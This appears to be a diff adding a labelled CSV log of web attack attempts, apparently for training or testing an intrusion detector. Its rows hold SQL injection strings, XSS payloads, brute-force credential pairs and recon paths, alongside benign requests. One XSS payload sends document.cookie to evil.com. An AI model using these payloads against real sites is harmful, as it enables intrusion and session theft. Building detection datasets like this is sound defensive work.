@@ -1,0 +1,35 @@
+timestamp,attack_type,payload_snippet,label,status_code,blocked
+2026-06-22T13:40:50.695020,sqli,"' UNION SELECT NULL,NULL,NULL--",1,N/A,False
+2026-06-22T13:40:55.290834,sqli,' OR 1=1--,1,N/A,False
+2026-06-22T13:40:59.824053,sqli,' AND 1=1--,1,N/A,False
+2026-06-22T13:41:04.410281,sqli,' OR 1=1--,1,N/A,False
+2026-06-22T13:41:09.019663,sqli,'; WAITFOR DELAY '00:00:05'--,1,N/A,False
+2026-06-22T13:41:16.386638,benign,normal_request,0,N/A,False
+2026-06-22T13:41:21.083825,benign,normal_request,0,N/A,False
+2026-06-22T13:41:25.563512,benign,normal_request,0,N/A,False
+2026-06-22T13:41:30.348125,xss,<a href='javascript:alert(1)'>click</a>,1,N/A,False
+2026-06-22T13:41:34.841664,xss,<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>,1,N/A,False
+2026-06-22T13:41:39.257290,xss,<iframe src='javascript:alert(1)'>,1,N/A,False
+2026-06-22T13:41:43.689687,xss,<svg onload=alert(1)>,1,N/A,False
+2026-06-22T13:41:48.150347,xss,<img src=x onerror=alert(1)>,1,N/A,False
+2026-06-22T13:41:50.314589,benign,normal_request,0,200,False
+2026-06-22T13:41:56.906030,benign,normal_request,0,N/A,False
+2026-06-22T13:42:02.867293,benign,normal_request,0,N/A,False
+2026-06-22T13:42:07.889375,brute_force,administrator:password,1,N/A,False
+2026-06-22T13:42:10.978278,brute_force,root:password,1,N/A,False
+2026-06-22T13:42:15.942398,brute_force,admin:admin123,1,N/A,False
+2026-06-22T13:42:19.014525,brute_force,admin:Admin@123,1,N/A,False
+2026-06-22T13:42:23.735389,brute_force,user:123456,1,N/A,False
+2026-06-22T13:42:26.814271,brute_force,admin:123456,1,N/A,False
+2026-06-22T13:42:32.724251,brute_force,user:Admin@123,1,N/A,False
+2026-06-22T13:42:37.462684,brute_force,user:Admin@123,1,N/A,False
+2026-06-22T13:42:40.651798,brute_force,user:Admin@123,1,N/A,False
+2026-06-22T13:42:45.069041,brute_force,administrator:Admin@123,1,N/A,False
+2026-06-22T13:42:49.674666,benign,normal_request,0,N/A,False
+2026-06-22T13:42:54.378726,benign,normal_request,0,N/A,False
+2026-06-22T13:42:59.443154,benign,normal_request,0,N/A,False
+2026-06-22T13:43:04.020009,recon,/backup.sql,1,N/A,False
+2026-06-22T13:43:08.273410,recon,/backup.sql,1,N/A,False
+2026-06-22T13:43:12.960700,recon,/phpmyadmin,1,N/A,False
+2026-06-22T13:43:17.187477,recon,/phpmyadmin,1,N/A,False
+2026-06-22T13:43:21.704396,recon,/db/virex.db,1,N/A,False
